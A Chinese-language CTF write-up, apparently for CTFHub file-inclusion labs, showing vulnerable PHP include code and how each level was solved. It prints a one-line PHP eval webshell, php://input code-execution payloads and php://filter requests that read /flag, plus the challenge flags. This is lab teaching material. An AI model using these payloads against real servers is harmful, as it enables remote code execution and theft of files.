---
title: 文件包含 Writeup
date: 2026-08-30 09:00:00
categories:
  - CTF wp
tags:
  - CTF
  - 文件包含
description: 文件包含 Writeup
---


```php
if (isset($_GET['file'])) {
    // 检查file参数值中是否包含"flag"字符串
    if (!strpos($_GET["file"], "flag")) {
        // 如果不包含"flag"，就包含该文件
        include $_GET["file"];
    } else {
        // 如果包含"flag"，则输出警告信息
        echo "Hacker!!!";
    }
} else {
    // 如果没有传递file参数，就显示当前文件的源代码
    highlight_file(__FILE__);
}
```

分析代码，要求参数中不能有flag字样，考虑绕过。但是，shell.txt文件中出现一句话木马，`<?php eval($_REQUEST['ctfhub']);?>`是一个**密码**为ctfhub的一句话木马，用蚁剑，连接成功

<img src="C:\Users\HP\Pictures\Screenshots\屏幕截图 2025-08-11 164903.png" style="zoom: 33%;" />

右键打开虚拟终端，在文件中查找flag，用`cat  /flag`,得flag为ctfhub{7c63a9dfbcf853e1dff7dceb}

![](C:\Users\HP\Pictures\Screenshots\屏幕截图 2025-08-11 165201.png)

# 二、php://input

考点：php伪协议，include函数，

常用到伪协议的`php://input`和`php://filter`，本题是前者

<img src="C:\Users\HP\Pictures\Screenshots\屏幕截图 2025-08-11 170228.png" style="zoom: 33%;" />

（substr函数，是指文件开头前六位必须是“php：//input”）

------

### **php：//input伪协议**：（**利用`php://input`执行代码**：）

如果`allow_url_include`开启，可通过`php://input`接收 POST 数据并作为 PHP 代码执行：

- GET 参数：`?file=php://input`
- POST 数据：`<?php system('。。。。。。'); ?>`

在phpinfo文件中显示，allow_url_include是on的状态，说明可用。

------

bp抓包，改参。直接cat查找flag不行，就从目录开始找(ls)

<img src="C:\Users\HP\Pictures\Screenshots\屏幕截图 2025-08-11 172429.png" style="zoom: 25%;" />

找到flag_17093,cat打开文件,得flag：ctfhub{da8496ee7b7500f5de84d6d0}

<img src="C:\Users\HP\Pictures\Screenshots\屏幕截图 2025-08-11 172447.png" style="zoom:33%;" />

# 三、读取源代码

考点：include函数，php://filter伪协议，filter过滤器

```php
if (isset($_GET['file'])) {
    // 严格检查file参数值的前6个字符是否为"php://"
    if (substr($_GET["file"], 0, 6) === "php://") {
        // 符合条件则包含该资源
        include($_GET["file"]);
    } else {
        // 不符合条件则输出警告
        echo "Hacker!!!";
    }
} else {
    // 没有传递file参数时，显示当前文件的源代码
    highlight_file(__FILE__);
}
```

------

### **php://filter伪协议**

可以作为一个中间流来处理其他流，具有四个参数：

| 名称                      | 描述                                                         | 备注 |
| ------------------------- | ------------------------------------------------------------ | ---- |
| resource=<要过滤的数据流> | 指定了你要筛选过滤的数据流。                                 | 必选 |
| read=<读链的筛选列表>     | 可以设定一个或多个过滤器名称，以管道符\|分隔。               |      |
| write=<写链的筛选列表>    | 可以设定一个或多个过滤器名称，以管道符分隔。                 |      |
| <；两个链的筛选列表>      | 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 |      |

`php://filter` 的基本使用格式如下：

```php
php://filter/[过滤链]/resource=[目标文件]
```

- **过滤链**：由一个或多个过滤器组成，用管道符 `|` 分隔，按顺序执行。

- **resource**：指定要处理的目标文件路径（必填参数）。

（还有的题不能直接出flag，需要base64输出`/?file=php://filter/read=convert.base64-encode/resource=/flag`）

------

bp抓包，改GET参数`?file=php://filter/resource=/flag`，得到flag：ctfhub{62d946f14b1617aebd65d23e}

![image-20250811174213672](/img/ctf/lfi-wp-001.png)

# 四、远程包含

分析代码，要求参数不能有flag，发现phpinfo中，allow_url_include是on，所以考虑使用php://input伪协议

<img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20250811180833467.png" alt="image-20250811180833467" style="zoom:33%;" />

bp抓包，步骤同上，得flag：ctfhub{8624a4d165a9dc546083cbe6}

<img src="C:\Users\HP\Pictures\Screenshots\屏幕截图 2025-08-11 180754.png" style="zoom: 25%;" />

<img src="C:\Users\HP\Pictures\Screenshots\屏幕截图 2025-08-11 180816.png" style="zoom:33%;" />
